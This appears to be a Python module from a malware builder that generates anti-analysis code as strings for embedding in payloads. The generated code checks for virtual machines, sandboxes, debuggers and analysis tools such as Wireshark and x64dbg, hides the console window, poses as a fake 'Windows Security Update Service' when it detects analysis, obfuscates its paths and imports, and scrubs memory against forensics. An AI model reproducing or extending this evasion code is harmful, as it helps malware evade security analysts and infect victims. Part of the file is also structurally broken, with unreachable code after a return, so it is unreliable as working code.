# -*- coding: utf-8 -*-
"""
反检测模块
提供反调试、反沙箱等功能
"""
import os
import sys
import time
import random
import platform
import subprocess
import threading
import datetime
from datetime import datetime


# 增强的反检测功能
def enhanced_evasion_techniques():
    """增强的反检测技术"""
    evasion_code = '''
# 增强反检测技术
import random
import string
import hashlib
import threading
import gc
from datetime import datetime

# 伪装成合法的系统维护脚本
class SystemMaintenanceService:
    def __init__(self):
        self.service_name = "Windows Security Update Service"
        self.version = "10.0.19041.1"
        self.initialized = False
    
    def initialize_service(self):
        """初始化系统服务"""
        if self.initialized:
            return True
        
        # 随机延迟模拟启动时间
        import time
        time.sleep(random.uniform(2.0, 5.0))
        
        # 内存清理
        gc.collect()
        
        # 生成合法服务ID
        service_id = hashlib.md5(
            f"{self.service_name}{datetime.now()}".encode()
        ).hexdigest()[:16]
        
        self.initialized = True
        return True
    
    def perform_maintenance(self):
        """执行系统维护"""
        if not self.initialized:
            self.initialize_service()
        
        # 模拟维护任务
        maintenance_tasks = [
            "Checking system integrity...",
            "Updating security definitions...", 
            "Optimizing system performance...",
            "Cleaning temporary files...",
            "Verifying system certificates..."
        ]
        
        for task in maintenance_tasks:
            # 模拟工作
            time.sleep(random.uniform(0.5, 1.5))
            
        return True

# 增强的环境检测
def is_analysis_environment():
    """检测是否在分析环境中运行"""
    try:
        # 检查虚拟机特征文件
        vm_files = [
            '/proc/scsi/scsi',
            '/sys/class/dmi/id/product_name',
            '/sys/class/dmi/id/sys_vendor',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys',
            'C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxSF.sys'
        ]
        
        for vm_file in vm_files:
            try:
                if os.path.exists(vm_file):
                    with open(vm_file, 'r', errors='ignore') as f:
                        content = f.read().lower()
                        if any(keyword in content for keyword in 
                              ['virtualbox', 'vmware', 'qemu', 'xen', 'vbox']):
                            return True
            except:
                continue
        
        # 检查处理器数量（沙箱通常只有1-2个核心）
        import multiprocessing
        if multiprocessing.cpu_count() < 2:
            return True
        
        # 检查内存大小（沙箱通常内存较小）
        try:
            if platform.system() == "Windows":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                c_ulong = ctypes.c_ulong
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", c_ulong),
                        ("dwMemoryLoad", c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]
                
                memory_status = MEMORYSTATUSEX()
                memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
                
                # 检查物理内存（小于4GB可能是沙箱）
                total_memory_gb = memory_status.ullTotalPhys / (1024**3)
                if total_memory_gb < 4:
                    return True
        except:
            pass
        
        # 检查网络连接（沙箱可能无法连接外网）
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex(('8.8.8.8', 53))
            sock.close()
            if result != 0:
                return True
        except:
            return True
        
        # 检查鼠标活动（沙箱中鼠标活动可能异常）
        if platform.system() == "Windows":
            try:
                import ctypes
                import time
                
                # 获取初始鼠标位置
                class POINT(ctypes.Structure):
                    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
                
                initial_pos = POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(initial_pos))
                
                time.sleep(2)
                
                current_pos = POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(current_pos))
                
                # 如果鼠标完全没有移动，可能是沙箱
                if initial_pos.x == current_pos.x and initial_pos.y == current_pos.y:
                    return True
            except:
                pass
        
        return False
    except:
        return False

# 混淆执行路径
def obfuscated_execution_path():
    """混淆执行路径"""
    import base64
    import zlib
    
    # 生成假的执行路径
    fake_paths = [
        "system_optimization.py",
        "network_diagnostics.py", 
        "security_scanner.py",
        "performance_monitor.py",
        "registry_cleaner.py"
    ]
    
    # 随机选择一个假路径
    fake_path = random.choice(fake_paths)
    
    # 混淆当前文件路径
    try:
        import sys
        real_path = sys.argv[0] if sys.argv else "unknown"
        
        # 生成混淆路径映射
        obfuscation_map = {
            real_path: fake_path,
            "__file__": fake_path,
            "__name__": fake_path.replace('.py', '')
        }
        
        return obfuscation_map
    except:
        return {}

# 动态导入隐藏
def dynamic_import_hiding():
    """动态导入隐藏"""
    import importlib
    
    # 隐藏敏感导入
    sensitive_modules = ['socket', 'subprocess', 'os', 'sys']
    hidden_imports = {}
    
    for module_name in sensitive_modules:
        try:
            # 动态导入并存储
            module = importlib.import_module(module_name)
            
            # 使用混淆名称
            obfuscated_name = ''.join(random.choices(string.ascii_letters, k=8))
            hidden_imports[obfuscated_name] = module
        except:
            continue
    
    return hidden_imports

# 内存清理和反取证
def memory_cleanup():
    """内存清理和反取证"""
    try:
        import gc
        import ctypes
        
        # 强制垃圾回收
        for _ in range(3):
            gc.collect()
        
        # 尝试清理内存
        if platform.system() == "Windows":
            try:
                # 清理工作集
                ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
            except:
                pass
        
        # 生成噪声数据覆盖内存痕迹
        noise_data = []
        for _ in range(100):
            noise_data.append(''.join(random.choices(
                string.ascii_letters + string.digits, k=1024
            )))
        
        # 清理噪声数据
        del noise_data
        gc.collect()
        
        return True
    except:
        return False
'''
    return evasion_code
    """创建高级反检测代码"""
    evasion_code = '''
import os
import sys
import time
import random
import platform
import subprocess
import threading
import ctypes
from datetime import datetime

# 隐藏控制台窗口 (Windows)
def hide_console():
    """隐藏控制台窗口"""
    if platform.system() == "Windows":
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        except:
            pass

# 反调试检测
def anti_debug_checks():
    """多重反调试检测"""
    try:
        # 检测调试器进程
        debug_processes = [
            'ollydbg.exe', 'ProcessHacker.exe', 'tcpview.exe', 'autoruns.exe',
            'autorunsc.exe', 'filemon.exe', 'procmon.exe', 'regmon.exe',
            'procexp.exe', 'idaq.exe', 'idaq64.exe', 'ImmunityDebugger.exe',
            'Wireshark.exe', 'dumpcap.exe', 'HookExplorer.exe', 'ImportREC.exe',
            'PETools.exe', 'LordPE.exe', 'SysInspector.exe', 'proc_analyzer.exe',
            'sysAnalyzer.exe', 'sniff_hit.exe', 'winAPIoverride.exe',
            'apimonitor.exe', 'x32dbg.exe', 'x64dbg.exe', 'windbg.exe',
            'gdb.exe', 'python.exe', 'pythonw.exe'
        ]
        
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output('tasklist', shell=True, 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        else:
            try:
                output = subprocess.check_output(['ps', 'aux'], 
                                               stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
                for proc in debug_processes:
                    if proc.lower() in output.lower():
                        return False
            except:
                pass
        
        # 检测Python调试模式
        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
            return False
            
        # 检测断点
        if sys.settrace is not None:
            return False
            
        return True
    except:
        return True

# 高级沙箱检测
def advanced_sandbox_detection():
    """高级沙箱环境检测"""
    try:
        # 1. 时间检测 - 检测时间加速
        start_time = time.time()
        time.sleep(1.5)
        elapsed = time.time() - start_time
        if elapsed < 1.2:  # 时间被加速
            return False
        
        # 2. 系统资源检测
        if platform.system() == "Windows":
            try:
                # 检测内存大小
                import psutil
                memory = psutil.virtual_memory().total / (1024**3)  # GB
                if memory < 2:  # 内存小于2GB
                    return False
                    
                # 检测CPU核心数
                cpu_count = psutil.cpu_count()
                if cpu_count < 2:
                    return False
                    
                # 检测硬盘大小
                disk = psutil.disk_usage('C:')
                disk_size = disk.total / (1024**3)  # GB
                if disk_size < 50:  # 硬盘小于50GB
                    return False
            except:
                pass
        
        # 3. 虚拟机特征检测
        vm_artifacts = [
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\Vmmouse.sys',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dgl.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmdum.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vm3dver.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmtray.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\VMToolsHook.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmmousever.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmhgfs.dll',
            'C:\\\\windows\\\\Sysnative\\\\Drivers\\\\vmGuestLib.dll'
        ]
        
        for artifact in vm_artifacts:
            if os.path.exists(artifact):
                return False
        
        # 4. 注册表检测 (Windows)
        if platform.system() == "Windows":
            try:
                import winreg
                vm_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Enum\\\\SCSI\\\\Disk&Ven_VMware_"),
                    (winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\\\CurrentControlSet\\\\Control\\\\CriticalDeviceDatabase\\\\root#vmwvmcihostdev"),
                    (winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools")
                ]
                
                for hkey, key_path in vm_keys:
                    try:
                        winreg.OpenKey(hkey, key_path)
                        return False
                    except:
                        continue
            except:
                pass
        
        # 5. 主机名检测
        hostname = platform.node().lower()
        vm_hostnames = ['sandbox', 'malware', 'virus', 'test', 'analysis', 
                       'vmware', 'virtualbox', 'vbox', 'qemu', 'xen']
        for vm_name in vm_hostnames:
            if vm_name in hostname:
                return False
        
        # 6. MAC地址检测
        try:
            import uuid
            mac = hex(uuid.getnode())[2:].upper()
            vm_macs = [
                '000569',  # VMware
                '000C29',  # VMware
                '001C14',  # VMware
                '005056',  # VMware
                '0A0027',  # VirtualBox
                '080027'   # VirtualBox
            ]
            for vm_mac in vm_macs:
                if mac.startswith(vm_mac):
                    return False
        except:
            pass
        
        # 7. 网络连接检测
        try:
            import socket
            test_sites = ['google.com', 'microsoft.com', 'github.com']
            for site in test_sites:
                try:
                    socket.create_connection((site, 80), timeout=3)
                    break
                except:
                    continue
            else:
                return False  # 无法连接任何网站
        except:
            pass
        
        # 8. 鼠标移动检测 (Windows)
        if platform.system() == "Windows":
            try:
                import win32gui
                pos1 = win32gui.GetCursorPos()
                time.sleep(2)
                pos2 = win32gui.GetCursorPos()
                if pos1 == pos2:  # 鼠标没有移动
                    return False
            except:
                pass
        
        return True
    except:
        return True

# 反分析延迟
def analysis_delay(delay_seconds=30):
    """反分析延迟执行"""
    try:
        # 多种延迟方式混合使用
        delay_methods = [
            lambda: time.sleep(delay_seconds / 3),
            lambda: [i for i in range(1000000)],  # CPU密集型操作
            lambda: time.sleep(delay_seconds / 3),
        ]
        
        for method in delay_methods:
            method()
            
        # 随机额外延迟
        time.sleep(random.uniform(1, delay_seconds / 6))
        
    except:
        time.sleep(delay_seconds)

def comprehensive_environment_check(silent_delay=30):
    """综合环境检查"""
    try:
        # 隐藏控制台
        hide_console()
        
        # 初始延迟
        analysis_delay(silent_delay)
        
        # 反调试检测
        if not anti_debug_checks():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        # 沙箱检测
        if not advanced_sandbox_detection():
            # 执行无害操作并退出
            time.sleep(random.uniform(10, 30))
            sys.exit(0)
        
        return True
    except:
        return False


def create_advanced_evasion_code():
    """创建高级反检测代码"""
    # 获取增强的反检测技术代码
    enhanced_code = enhanced_evasion_techniques()
    
    # 构建完整的反检测代码
    evasion_code = enhanced_code + '''

# 启动系统维护服务
def start_maintenance_service():
    try:
        service = SystemMaintenanceService()
        if service.perform_maintenance():
            return True
    except:
        pass
    return False

# 主反检测函数
def advanced_anti_detection():
    """高级反检测主函数"""
    try:
        # 检查分析环境
        if is_analysis_environment():
            # 执行假的维护任务后退出
            start_maintenance_service()
            import sys
            sys.exit(0)
        
        # 混淆执行环境
        obfuscation_map = obfuscated_execution_path()
        
        # 隐藏敏感导入
        hidden_imports = dynamic_import_hiding()
        
        # 内存清理
        memory_cleanup()
        
        return True
    except:
        return False

# 初始化反检测
if not advanced_anti_detection():
    import sys
    sys.exit(0)
'''
    
    return evasion_code
